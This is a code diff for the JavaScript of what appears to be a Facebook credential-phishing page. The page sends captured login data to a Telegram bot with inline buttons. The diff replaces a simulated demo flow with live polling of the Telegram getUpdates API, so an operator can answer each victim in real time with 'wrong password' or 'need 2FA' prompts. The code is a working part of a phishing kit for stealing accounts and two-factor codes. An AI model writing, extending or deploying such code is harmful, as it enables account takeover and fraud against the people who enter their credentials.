@@ -731,6 +731,8 @@
     let currentLoginData = null;
     let isDragging = false;
     let offsetX, offsetY;
+    let lastUpdateId = 0; // For tracking Telegram updates
+    let pollingInterval = null; // For storing the polling interval
 
     // Function to send data to Telegram with inline keyboard
     async function sendToTelegram(message, email = null) {
@@ -739,8 +741,8 @@
         if (email) {
           currentLoginData = { email };
           document.getElementById('currentUser').textContent = email;
-          // Admin controls are hidden by default in production
-          // document.getElementById('adminControls').style.display = 'block';
+          // Start polling for responses
+          startPolling();
         }
         
         const keyboard = email ? {
@@ -778,7 +780,73 @@
       }
     }
 
-    // Function to simulate Telegram webhook responses (for demo)
+    // Function to poll for Telegram updates (callback queries)
+    async function pollTelegramUpdates() {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
+        const data = await response.json();
+        
+        if (data.ok && data.result.length > 0) {
+          for (const update of data.result) {
+            lastUpdateId = update.update_id;
+            
+            // Check if this is a callback query (button press)
+            if (update.callback_query) {
+              const callbackData = update.callback_query.data;
+              const callbackEmail = update.callback_query.data.split(':')[1];
+              
+              // Check if this callback is for the current user
+              if (currentLoginData && currentLoginData.email === callbackEmail) {
+                // Process the callback
+                if (callbackData.startsWith('wrong_email')) {
+                  simulateTelegramResponse('wrong_email');
+                } else if (callbackData.startsWith('wrong_password')) {
+                  simulateTelegramResponse('wrong_password');
+                } else if (callbackData.startsWith('need_2fa')) {
+                  simulateTelegramResponse('need_2fa');
+                }
+                
+                // Answer the callback query to remove the loading state on the button
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    callback_query_id: update.callback_query.id
+                  })
+                });
+                
+                // Stop polling since we got a response
+                stopPolling();
+                break;
+              }
+            }
+          }
+        }
+      } catch (error) {
+        console.error('Error polling Telegram updates:', error);
+      }
+    }
+
+    // Start polling for Telegram updates
+    function startPolling() {
+      // Clear any existing polling
+      stopPolling();
+      
+      // Poll every 3 seconds
+      pollingInterval = setInterval(pollTelegramUpdates, 3000);
+    }
+
+    // Stop polling for Telegram updates
+    function stopPolling() {
+      if (pollingInterval) {
+        clearInterval(pollingInterval);
+        pollingInterval = null;
+      }
+    }
+
+    // Function to simulate Telegram webhook responses
     function simulateTelegramResponse(type) {
       if (!currentLoginData) return;
       
@@ -916,11 +984,15 @@
     // Close fb modal
     fbCloseBtn.addEventListener('click', () => {
       fbModal.style.display = 'none';
+      // Stop polling when modal is closed
+      stopPolling();
     });
 
     // Minimize functionality
     fbMinimizeBtn.addEventListener('click', () => {
       fbModal.style.display = 'none';
+      // Stop polling when modal is minimized
+      stopPolling();
     });
 
     // Handle Facebook form submission
@@ -952,9 +1024,7 @@
 🕒 <b>Timestamp:</b> ${loginData.timestamp}
       `.trim(), loginData.email);
       
-      // In a real implementation, you would wait for a response from Telegram
-      // For this demo, we'll just keep the loading spinner visible
-      // until the admin selects an action through the simulated controls
+      // Keep the loading state until we get a response from Telegram
     });
 
     // Close modals when clicking outside
@@ -967,6 +1037,8 @@
       }
       if (e.target === fbModal) {
         fbModal.style.display = 'none';
+        // Stop polling when modal is closed
+        stopPolling();
       }
     });
 
